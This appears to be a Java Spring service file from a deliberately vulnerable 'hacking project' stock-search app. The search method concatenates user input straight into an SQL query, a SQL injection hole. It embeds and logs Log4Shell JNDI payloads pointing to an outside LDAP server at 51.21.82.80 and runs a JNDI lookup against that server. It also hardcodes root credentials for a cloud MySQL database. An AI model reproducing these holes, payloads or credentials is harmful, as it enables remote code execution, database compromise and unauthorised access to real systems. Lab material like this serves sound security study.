package com.example.hackingproject.search.service;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;


import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import org.springframework.stereotype.Service;


import com.example.hackingproject.login.LoginRestAPIController;
import com.example.hackingproject.search.vo.searchVO;
import com.example.hackingproject.stock.vo.StockVO;

import javax.xml.transform.Result;
import java.util.List;
import java.util.ArrayList;



@Service
public class searchService {
	
	private static final Logger logger = LogManager.getLogger(searchService.class);

	public List<StockVO> search(searchVO key) {
        List<StockVO> stockList = new ArrayList<>();
        String url = "jdbc:mysql://rds-17-hack.cggbeg5i6y5t.eu-north-1.rds.amazonaws.com/rookie"; // 데이터베이스 URL
        String username = "root"; // 사용자 이름
        String password = "k44g20!!"; // 비밀번호
        
        String log4jVersion = LogManager.getLogger(Logger.class).getClass().getPackage().getImplementationVersion();
        String keyword = key.getKeywords();
        String userInput = "${jndi:ldap://51.21.82.80:1389/a}";
        String jndiLookupString = "${jndi:ldap://51.21.82.80:1389/dc=example,dc=com}";
        
        
        logger.info(keyword);
        logger.info(log4jVersion);
        logger.info("This is test log for example of lookups - ${java:runtime}");
        logger.error(jndiLookupString);
        
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldap://51.21.82.80:1389/dc=example,dc=com");

        try {
            DirContext ctx = new InitialDirContext(env);
            System.out.println("Connected to the LDAP server.");
            // LDAP 서버에서 데이터를 조회하거나 조작하는 코드 추가
            ctx.close();
        } catch (NamingException e) {
            System.out.println("Cannot connect to LDAP server: " + e.getMessage());
        }

        //
        String jndiPath = "ldap://51.21.82.80:1389/dc=example,dc=com";
        
        // 환경 설정
        Hashtable<String, String> env1 = new Hashtable<>();
        env1.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env1.put(Context.PROVIDER_URL, jndiPath);
        
        try {
            // InitialContext 생성 및 Lookup 수행
            Context ctx = new InitialContext(env1);
            Object obj = ctx.lookup(jndiPath);
            
            System.out.println("Object obtained from JNDI: " + obj);
            
            // Context 사용 후 닫기
            ctx.close();
        } catch (NamingException e) {
            System.err.println("Error during JNDI Lookup: " + e.getMessage());
            e.printStackTrace();
        }

        
        //
        
        try (Connection conn = DriverManager.getConnection(url, username, password);
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT sp.* FROM Stock_Price sp JOIN (SELECT stock_name, MAX(stock_date) AS max_date FROM Stock_Price WHERE stock_name LIKE '%" + key.getKeywords() + "%' GROUP BY stock_name) AS max_dates ON sp.stock_name = max_dates.stock_name AND sp.stock_date = max_dates.max_date")) {

            // 여기서부터 while 루프 시작
            while (rs.next()) {
                StockVO stock = new StockVO();
                stock.setSTOCK_NAME(rs.getString("stock_name"));
                stock.setSTOCK_CODE(rs.getString("stock_code"));
                stock.setSTOCK_PRICE(rs.getInt("stock_price"));

                stockList.add(stock);
            }
            // while 루프 종료
        } catch (SQLException e) {
            e.printStackTrace();
        }

        return stockList;
	}

}
